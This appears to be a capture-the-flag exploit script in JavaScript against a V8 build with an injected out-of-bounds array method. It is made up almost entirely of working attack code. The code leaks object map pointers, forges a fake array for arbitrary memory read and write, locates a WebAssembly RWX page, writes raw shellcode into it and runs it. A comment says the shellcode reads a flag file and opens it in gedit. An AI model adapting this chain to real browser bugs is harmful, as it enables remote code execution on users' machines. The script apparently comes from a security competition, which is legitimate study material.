function gc() { for (let i = 0; i < 0x10; i++) { new ArrayBuffer(0x1000000); } }
var f64 = new Float64Array(1);
var u32 = new Uint32Array(f64.buffer);

function d2u(v) {
    f64[0] = v;
    return u32;
}

function u2d(lo, hi) {
    u32[0] = lo;
    u32[1] = hi;
    return f64[0];
}

function hex(lo, hi) {
    if( lo == 0 ) {
        return ("0x" + hi.toString(16) + "00000000");
    }
    if( hi == 0 ) {
        return ("0x" + lo.toString(16));
    }
    return ("0x" + ('00000000'+hi.toString(16)).substr(8) +('00000000'+lo.toString(16)).substr(8));
}

gc();

let wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 2, 127, 127, 1, 127, 3, 2, 1, 0, 4, 4, 1, 112, 0, 0, 5, 3, 1, 0, 1, 7, 21, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 8, 95, 90, 51, 97, 100, 100, 105, 105, 0, 0, 10, 9, 1, 7, 0, 32, 1, 32, 0, 106, 11]);
let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});
let f = wasm_mod.exports._Z3addii;
let buffer = new ArrayBuffer(0x200);
let dataview = new DataView(buffer);
var obj = {"123":123};
let a = [1.1];
let b = [dataview];
let c = [1.1];
let d = [1.1];

float_map = a.oob();
var_map = b.oob();
leak_addr = d2u(float_map);
console.log("[-] double array map pointer: " + hex(leak_addr[0],leak_addr[1]));
leak_addr = d2u(var_map);
console.log("[-] var array map pointer: " + hex(leak_addr[0],leak_addr[1]));

b.oob(float_map);

var fake_obj = [
    u2d(d2u(float_map)[0], d2u(float_map)[1]),
    u2d(0, 0),
    u2d(d2u(float_map)[0], d2u(float_map)[1]), // the element pointer. Set it to where you want to read or write
    u2d(0x0, 0x1000),
].slice(0);

var victim = [fake_obj];
victim.oob(float_map);
leak_addr = d2u(victim[0]);
console.log("[-] Fake array: " + hex(leak_addr[0],leak_addr[1]));
b[0] = u2d(leak_addr[0]-0x20, leak_addr[1]);
b.oob(var_map);
victim.oob(var_map);
victim[0][2]=u2d(leak_addr[0],leak_addr[1]);

var ccc = [0x1234,0xdead,0xbeef,f,buffer];
oob_obj = b[0];

var wasm_idx = 0;
var buffer_idx = 0;
for(let i = 0; i<0x1000; i++){
    if(d2u(oob_obj[i])[1] === 0x1234){
        if(d2u(oob_obj[i+1])[1] === 0xdead){
            wasm_idx = i + 3;
            buffer_idx = i+4;
            console.log("Found!");
            break;
        }
    }
}

let wasm_obj_lo = d2u(oob_obj[wasm_idx])[0];
let wasm_obj_hi = d2u(oob_obj[wasm_idx])[1];
let buffer_lo = d2u(oob_obj[buffer_idx])[0];
let buffer_hi = d2u(oob_obj[buffer_idx])[1];
console.log("[-] buffer pointer : " + hex(buffer_lo, buffer_hi));
console.log("[-] wasm object : " + hex(wasm_obj_lo, wasm_obj_hi));

victim[0][2]=u2d(wasm_obj_lo-0x170 - 0x10 +0x18, wasm_obj_hi);
//victim[0][2]=u2d(wasm_obj_lo-0x170 - 0x10, wasm_obj_hi); // if you debug in d8, use this line

rwx_page = oob_obj[0];
rwx_page_lo = d2u(rwx_page)[0];
rwx_page_hi = d2u(rwx_page)[1];
console.log("[-] rwx page : " + hex(rwx_page_lo, rwx_page_hi));

victim[0][2]=u2d(buffer_lo+0x10 ,buffer_hi);
oob_obj[0] = u2d(rwx_page_lo,rwx_page_hi);

// execute '/get_flag >/tmp/txt ;DISPLAY=:0 /usr/bin/gedit /tmp/txt'
var shellcode =[2572696426, 1647295304, 1932488297, 1213399144, 761849737, 1207959651, 3897747081, 51, 790655852, 1949253152, 1949266029, 991982712, 1347635524, 1029259596, 790638650, 796029813, 795765090, 1768187239, 1949245556, 1949266029, 1442870392, 3867756631, 2425357583];

for(let i = 0; i < shellcode.length; i++) {
	dataview.setUint32(i * 4, shellcode[i], true);
}

f();
